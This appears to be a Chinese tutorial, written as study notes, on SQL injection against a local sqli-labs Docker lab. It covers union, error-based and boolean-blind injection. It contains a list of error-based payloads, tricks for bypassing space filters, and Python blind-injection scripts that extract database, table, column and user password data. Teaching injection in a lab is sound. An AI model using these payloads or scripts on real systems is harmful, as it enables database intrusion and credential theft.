# SQL注入概念和前期知识

**SQL 注入漏洞：**

最常见的漏洞之一，在 OWASP TOP Ten 中长期位居前三。SQL注入是发生于应用程序的数据库层的安全漏洞。具体表现在输入的字符串之中注入SQL指令，在设计不良的程序(Web系统,客户端)当中忽略了检查，那么这些注入进去的指令就会被数据库服务器认为是正常的SQL指令而运行，因此遭到数据库被篡改或服务器被攻击。

![image-20230303093730193](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030937290.png)

**Web 服务中的 SQL 数据库查询**

PHP、ASP、JSP 等脚本语言使 Web 应用可以动态处理 HTTP 请求，并提供数据库访问接口，以满足数据交互的需求。

![image-20230303094758125](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030947182.png)

**通过以下例子逐步追踪涉及数据库交互的HTTP 请求响应工作原理**

在浏览器上点击链接，浏览器向Web服务器发送HTTP请求，用Burp抓包看到HTTP请求细节，此处是访问 /backend/content_detail.php 并用Get方法传递了参数id=1。

![image-20230303094812997](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948041.png)

![image-20230303094827504](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948550.png)

在浏览器上看到Web服务器响应的结果，在Burp中可以看到响应包的细节。

![image-20230303094842513](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948557.png)

![image-20230303094852590](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948633.png)

![image-20230303094923982](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949024.png)

在Web服务器查看 /backend/content_detail.php ，浏览器用Get方法传递的参数 id=1 在PHP代码中被赋值给变量 $id，然后拼接出 SQL 语句 select title, content from contents where id=1; 后发往MySQL 数据库进行查询。

![image-20230303094937657](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949715.png)

查看 db.php 和 config.php 两个PHP文件，看到关于数据库连接的配置信息。PHP 以用户名密码root/root 登录本地数据库，并访问其中的 news 库。

![image-20230303094950565](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949609.png)

![image-20230303094957532](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949586.png)

连接mysql数据库，执行前面所说的 SQL 语句，查询结果与浏览器显示一致。

![image-20230303095004098](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950158.png)

经过以上对浏览器操作的逻辑追踪，我们再来理解这张图。现在请思考：对于普通用户、攻击者/渗透测试人员，哪些部分是可控的？

![image-20230303095029475](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950542.png)

可以修改 HTTP GET 参数id的值控制数据库执行的 SQL 语句。



在 HTTP GET 参数 id 中注入 SQL 语句，适当构造后可以拖取数据库内容。

![image-20230303095039504](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950556.png)

![image-20230302221305379](https://raw.githubusercontent.com/countdracular/pic-md/main/202303022213418.png)

常用 SQL 语法：
show databases;
show columns from 表1;
select user(); select database(); select version(); select @@basedir; select @@datadir;
select 字段1, 字段2, ... from 表1 union select 字段1, 字段2, ... from 表2;

**练习环境搭建**
在Kali 虚拟机里启动靶机 docker 容器：docker start b1d6b0fc9e9c
进入容器命令行：docker exec -it b1d6 /bin/bash

![image-20230303095048065](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950123.png)

进入 MySQL： mysql

![image-20230303095055285](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950330.png)

访问网页界面，初始化数据库。

![image-20230303095103471](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951520.png)

# SQL注入基本方法

## 联合查询注入

### 原理简述

1. 后台语句形如 select * from 表1 where 字段1 =  [可控字符串]
2. 构造可控字符串为 -1 union select a,b,c,...，最终SQL语句为 select * from 表1 where 字段1 = -1 union select a,b,c,...
3. 当 union select 字段数与前面语句字段数相同，且前面的查询结果为空时，a,b,c,...的结果成为查询最终结果。

### 操作步骤

**根据报错信息推断后台 SQL 语句**
MySQL 语法错误的报错信息会显示部分 SQL 语句，Less-1 例题输入 id=1’的错误提示表面 SQL 语句中存在 '1'' LIMIT 0,1 ，由此推测完整语句如下：
select * from 表1 where 字段1=’$_GET[id]’；

# ![image-20230303095112705](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951771.png)

后台 SQL 语句用单引号保护了输入变量，输入字符串都不会被解析为 SQL 语句。

为了打破这层保护，输入单引号向前闭合，输入注释符使后面的单引号失效，即可在中间注入 SQL 语句。

```sql
select * from 表1 where 字段1='      -1'此处可注入SQL语句%23           '
```

**根据 order by 报错判断查询字段数**

order by 跟数字表示按返回结果的第几个字段排序，数字超出返回字段数时报错。

![image-20230303095119831](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951883.png)

**union select 联合查询，将所需信息打印到页面**

![image-20230303095128919](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951963.png)

**information_schema 中常用的两张表：tables、columns**

![image-20230303095136350](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951408.png)

![image-20230303095143517](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951570.png)

**注入得到表名和字段名**

![image-20230303095149109](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951159.png)

**查询任意表的内容**

![image-20230303095156893](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951957.png)

## 报错注入

### 原理简述

当页面不显示查询结果，但显示报错信息时，可构造特定报错语句，并在其中注入查询语句，将查询结果输出到报错信息中。

1. 通过向前/向后闭合、注释符等方法找到注入点。
2. 注入特定报错语句，查看报错信息是否包含查询结果。
3. 在语句中构造各种查询，获取数据库信息。

### 操作步骤

闭合单引号，找到注入点。

![image-20230303150241670](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031502724.png)

测试报错语句是否能输入查询结果

![](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031457308.png)

查询表名

![image-20230303150619116](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031506177.png)

查询字段名

![image-20230303150953257](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031509320.png)

查询内容

![image-20230303151032412](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031510479.png)

报错信息可能有长度限制，需要活用limit、left、right、mid等语句逐个/段输出。

![image-20230303151205345](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031512413.png)

![image-20230303151357400](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031513461.png)

### 报错语句总结

一般情况用updatexml()和extractvalue()，默认不带空格、*号、and等常被过滤的字符。

```sql
(updatexml(1,concat(111,(user()),111),1)) #没有空格、*、and
(extractvalue(1,concat(111,(user()),111))) #没有空格、*、and
(extractvalue(rand(),concat(111,version())),1) #没有空格和*，但rand里面有and
geometrycollection((select * from(select * from(select user())a)b))
multipoint((select * from(select * from(select user())a)b))
polygon((select * from(select * from(select user())a)b))
multipolygon((select * from(select * from(select user())a)b))
linestring((select * from(select * from(select user())a)b))
multilinestring((select * from(select * from(select user())a)b))
exp(~(select * from(select user())a))
(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 
```

如果确实禁用空格可用括号绕过。

```
select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())
(updatexml(1,concat(111,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),111),1))
```

## 布尔盲注

### 原理简述

页面不显示查询结果和报错信息，但查询结果是否为空对应页面显示不同的情况，通过构造SQL语句验证特定布尔值的真假，通过验证大量布尔值可恢复出完整数据。

有点像警察在询问只有眼皮会动的目击者，眨一次眼表示“是”，眨两次眼表示“否”。由于需要大量交互，一般使用自动化工具或编写自动化脚本完成盲注。

### 操作步骤

尝试各种输入，发现不同输出页面

![image-20230303154648860](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031546908.png)![image-20230303155515090](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031555149.png)

构造注入点

![image-20230303155739035](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031557084.png)![image-20230303155758665](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031557713.png)

将1=1、1=2替换为特定布尔表达式，根据页面输出即可判断布尔值真假。

例如，判断当前数据库名的字符长度为8

![image-20230303160141504](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031601556.png)![image-20230303160206334](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031602376.png)

写python脚本布尔盲注database()

```python
import requests

result = ''
for i in range(100):
    for j in range(31,127):
        payload = 'ascii(mid(database(),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161149636](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031611689.png)

获取表名

```
import requests

result = ''
for i in range(100):
    for j in range(31,127):
        payload = 'ascii(mid((select group_concat(table_name)from information_schema.tables where table_schema=database()),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161351595](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031613696.png)

获取字段名

```python
import requests

result = ''
for i in range(100):
    for j in range(31,127):
        payload = 'ascii(mid((select group_concat(column_name)from information_schema.columns where table_schema=database()and table_name="users"),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161553758](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031615845.png)

查询表的内容

```
import requests
             
result = ''  
for i in range(200):
    for j in range(31,127):
        payload = 'ascii(mid((select group_concat(username,0x2b,password)from users),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161902744](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031619932.png)





# 绕过过滤

# 实操练习
